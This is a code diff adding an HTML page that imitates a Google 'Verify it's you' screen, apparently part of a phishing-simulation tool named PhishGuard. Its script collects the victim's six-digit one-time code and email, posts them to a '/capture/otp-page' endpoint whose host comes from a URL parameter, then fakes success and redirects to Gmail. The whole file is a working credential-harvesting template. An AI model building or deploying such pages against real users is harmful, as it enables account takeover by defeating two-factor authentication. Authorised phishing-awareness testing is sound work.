@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gmail - Verify Your Identity</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+      padding: 40px;
+      max-width: 360px;
+      width: 100%;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo-text {
+      font-size: 24px;
+      font-weight: 500;
+      color: #4285f4;
+    }
+    .security-icon {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .security-icon svg {
+      width: 48px;
+      height: 48px;
+      color: #4285f4;
+    }
+    h1 {
+      font-size: 20px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      color: #5f6368;
+      margin-bottom: 5px;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+      transition: border-color 0.3s;
+      letter-spacing: 2px;
+      font-weight: 600;
+    }
+    input:focus {
+      outline: none;
+      border-color: #4285f4;
+      box-shadow: 0 1px 1px rgba(66,133,244,0.3);
+    }
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+      gap: 10px;
+    }
+    button {
+      padding: 10px 24px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-back {
+      background: #f8f9fa;
+      color: #3c4043;
+      border: 1px solid #dadce0;
+      flex: 1;
+    }
+    .btn-back:hover {
+      background: #f8f9fa;
+      border-color: #4285f4;
+      color: #4285f4;
+    }
+    .btn-verify {
+      background: #4285f4;
+      color: white;
+      flex: 1;
+    }
+    .btn-verify:hover {
+      background: #3367d6;
+    }
+    .btn-verify:disabled {
+      background: #dadce0;
+      cursor: not-allowed;
+    }
+    .error {
+      color: #d33b27;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+    .info-box {
+      background: #f8f9fa;
+      border-left: 4px solid #4285f4;
+      padding: 12px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+      font-size: 13px;
+      color: #5f6368;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #4285f4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <div class="logo-text">Google</div>
+    </div>
+
+    <div class="security-icon">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m7 0a9 9 0 11-18 0 9 9 0 0118 0z" />
+      </svg>
+    </div>
+
+    <div id="otpStep">
+      <h1>Verify it's you</h1>
+      <p>A code has been sent to your phone. Enter it to verify your identity.</p>
+      
+      <div class="info-box">
+        📱 Check your phone for the 6-digit code
+      </div>
+      
+      <form id="otpForm">
+        <div class="form-group">
+          <label for="otp">Verification Code</label>
+          <input
+            type="text"
+            id="otp"
+            name="otp"
+            placeholder="000000"
+            maxlength="6"
+            required
+            autocomplete="off"
+          >
+          <div class="error" id="otpError"></div>
+        </div>
+
+        <input type="hidden" name="token" value="">
+        <input type="hidden" name="email" value="">
+
+        <div class="button-group">
+          <button type="button" class="btn-back" onclick="goBack()">Back</button>
+          <button type="submit" class="btn-verify" id="otpSubmit">Verify</button>
+        </div>
+      </form>
+
+      <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p style="margin-top: 10px; color: #5f6368;">Verifying...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Configuration
+    const PHISHGUARD_API = new URLSearchParams(window.location.search).get('api') || 'http://localhost:8000/api/v1'
+    const TRACKING_TOKEN = new URLSearchParams(window.location.search).get('token') || ''
+    const EMAIL = new URLSearchParams(window.location.search).get('email') || ''
+    
+    // Set values
+    document.querySelector('input[name="token"]').value = TRACKING_TOKEN
+    document.querySelector('input[name="email"]').value = EMAIL
+
+    // Auto-format OTP input (numbers only)
+    document.getElementById('otp').addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '')
+    })
+
+    function goBack() {
+      window.history.back()
+    }
+
+    // OTP form submit
+    document.getElementById('otpForm').addEventListener('submit', async (e) => {
+      e.preventDefault()
+      
+      const otp = document.getElementById('otp').value
+      const otpError = document.getElementById('otpError')
+      const submitBtn = document.getElementById('otpSubmit')
+      const form = document.getElementById('otpStep')
+      const loading = document.getElementById('loading')
+      
+      if (!otp || otp.length !== 6) {
+        otpError.textContent = 'Please enter a valid 6-digit code'
+        otpError.style.display = 'block'
+        return
+      }
+      
+      submitBtn.disabled = true
+      form.style.display = 'none'
+      loading.style.display = 'block'
+      
+      try {
+        const response = await fetch(`${PHISHGUARD_API}/capture/otp-page`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            token: TRACKING_TOKEN,
+            email: EMAIL,
+            otp: otp,
+            platform: 'custom'
+          })
+        })
+        
+        // Success message
+        setTimeout(() => {
+          loading.innerHTML = `
+            <div style="text-align: center;">
+              <svg width="48" height="48" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="color: #0f9d58; margin: 0 auto 15px;">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+              </svg>
+              <p style="color: #0f9d58; font-weight: 500; margin-top: 10px;">Verification successful!</p>
+              <p style="color: #5f6368; margin-top: 10px;">Redirecting...</p>
+            </div>
+          `
+          
+          // Redirect to Gmail after 2 seconds
+          setTimeout(() => {
+            window.location.href = 'https://mail.google.com'
+          }, 2000)
+        }, 500)
+      } catch (err) {
+        console.error('Error:', err)
+        form.style.display = 'block'
+        loading.style.display = 'none'
+        otpError.textContent = 'Error verifying code. Please try again.'
+        otpError.style.display = 'block'
+        submitBtn.disabled = false
+      }
+    })
+  </script>
+</body>
+</html>
